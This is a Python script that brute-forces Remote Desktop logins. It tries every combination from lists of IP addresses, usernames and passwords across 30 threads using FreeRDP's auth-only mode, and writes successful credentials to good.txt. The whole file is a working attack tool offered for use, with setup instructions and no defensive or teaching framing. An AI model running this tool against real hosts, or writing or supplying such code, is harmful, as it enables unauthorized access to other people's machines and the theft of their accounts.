#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""

RDP BRUTeforce Windows, Linux version

The process_combination() function now accepts ip.txt lines that are either "IP:port" or "IP". 
If the port is missing, the default port 3389 is used.
The try_rdp() function builds and executes the RDP command using xfreerdp (Linux) or wfreerdp.exe (Windows).
The order of trying combinations is: for each password, then for each username, then for each IP from ip.txt.
Successful combinations are written into good.txt as:  
"ip:port /d:<server> | username | password"

Ensure that xfreerdp for Linux or wfreerdp.exe for Windows is available in your PATH, 
depending on your operating system.

ip.txt file may contain either just the IP (in which case the standard RDP port 3389 is used) 
or the IP with a port in the format "IP:port".

Linux:
  sudo apt install freerdp2-x11

Download wfreerdp.exe from:
  https://github.com/FreeRDP/FreeRDP/releases
  https://ci.freerdp.com/job/freerdp-nightly-windows/arch=win32,label=vs2017/
"""

import subprocess
import shlex
import concurrent.futures
import threading
import sys
import time

# Files containing input data.
ip_file = "ip.txt"
users_file = "users.txt"
passwords_file = "passwords.txt"
output_file = "good.txt" 

# Timeout (in seconds) for each RDP attempt.
timeout = 15
# Maximum number of concurrent threads.
max_workers = 30

# Lock for thread-safe output and file writes
print_lock = threading.Lock()

def read_file_lines(filename):
    """
    Reads lines from a file and returns a list of non-empty, stripped lines.
    """
    try:
        with open(filename, "r", encoding="utf-8") as f:
            lines = [line.strip() for line in f if line.strip()]
        return lines
    except Exception as e:
        with print_lock:
            print(f"Error reading file {filename}: {e}")
        return []

def try_rdp(ip, port, server, username, password, timeout=15):
    """
    Attempts an RDP connection using the provided parameters.
    Uses the +auth-only flag to only check authentication before exiting.
    
    The function automatically selects the binary based on the platform:
      - Linux: xfreerdp
      - Windows: wfreerdp.exe (ensure it is installed)
      
    Returns True if authentication is successful (exit code 0), otherwise False.
    """
    address = f"{ip}:{port}"
    
    if sys.platform.startswith("win"):
        binary = "wfreerdp.exe"
    else:
        binary = "xfreerdp"
    
    # Use a default domain/server if empty.
    if not server:
        server = "."
        
    cmd = f"{binary} /v:{address} /u:{username} /p:{password} /d:{server} +auth-only"
    
    with print_lock:
        print(f"Checking RDP: {address} | Username: {username} | Password: {password}")
    
    try:
        args = shlex.split(cmd)
        result = subprocess.run(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=timeout)
        if result.returncode == 0:
            with print_lock:
                print(f"Success: {address} with username: {username}")
            return True
        else:
            with print_lock:
                print(f"Authentication failed for {address} with username: {username}. Exit code: {result.returncode}")
            return False
    except subprocess.TimeoutExpired:
        with print_lock:
            print(f"Timeout for {address} with username: {username}")
        return False
    except Exception as e:
        with print_lock:
            print(f"Error connecting to {address} with username: {username}: {e}")
        return False

def process_combination(ip_line, username, password, timeout):
    """
    Processes one combination of an IP, username, and password.
    
    The ip_line can be in one of two formats:
      - "IP:port"
      - "IP"
    If only the IP is provided, the default RDP port 3389 is used.
    
    The server (domain) is defaulted to ".", but you may adjust this as needed.
    
    Returns a string describing the successful combination, formatted as:
      "ip:port /d:<server> | username | password"
    or None if the connection fails.
    """
    # Check if the ip_line includes a colon.
    if ":" in ip_line:
        parts = ip_line.split(":", 1)
        if len(parts) != 2 or not parts[0].strip() or not parts[1].strip():
            with print_lock:
                print(f"Skipping line (invalid IP or port): {ip_line}")
            return None
        ip = parts[0].strip()
        port = parts[1].strip()
    else:
        ip = ip_line.strip()
        port = "3389"
    
    server = "."
    
    time.sleep(0.2)
    
    if try_rdp(ip, port, server, username, password, timeout=timeout):
        return f"{ip}:{port} /d:{server} | {username} | {password}"
    return None

def combination_generator(ip_list, users, passwords):
   
    for password in passwords:
        for user in users:
            for ip_line in ip_list:
                yield (ip_line, user, password)

def main():
    # Read input data from files.
    ip_list = read_file_lines(ip_file)
    users = read_file_lines(users_file)
    passwords = read_file_lines(passwords_file)
    
    if not ip_list:
        print(f"The file {ip_file} does not contain any IP addresses or it was not found.")
        return
    if not users:
        print(f"The file {users_file} does not contain any usernames or it was not found.")
        return
    if not passwords:
        print(f"The file {passwords_file} does not contain any passwords or it was not found.")
        return
    
    good_credentials = []
    
    combos = combination_generator(ip_list, users, passwords)
    
    batch_size = 1000
    batch = []
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        for combo in combos:
            batch.append(combo)
            if len(batch) >= batch_size:
                future_to_combo = {
                    executor.submit(process_combination, ip_line, user, password, timeout): (ip_line, user, password)
                    for (ip_line, user, password) in batch
                }
                for future in concurrent.futures.as_completed(future_to_combo):
                    result = future.result()
                    if result:
                        good_credentials.append(result)
                batch = []
     
        if batch:
            future_to_combo = {
                executor.submit(process_combination, ip_line, user, password, timeout): (ip_line, user, password)
                for (ip_line, user, password) in batch
            }
            for future in concurrent.futures.as_completed(future_to_combo):
                result = future.result()
                if result:
                    good_credentials.append(result)
    
    try:
        with open(output_file, "a", encoding="utf-8") as f:
            for cred in good_credentials:
                f.write(cred + "\n")
        print(f"Successful combinations saved in {output_file}")
    except Exception as e:
        print(f"Error writing to file {output_file}: {e}")

if __name__ == "__main__":
    main()
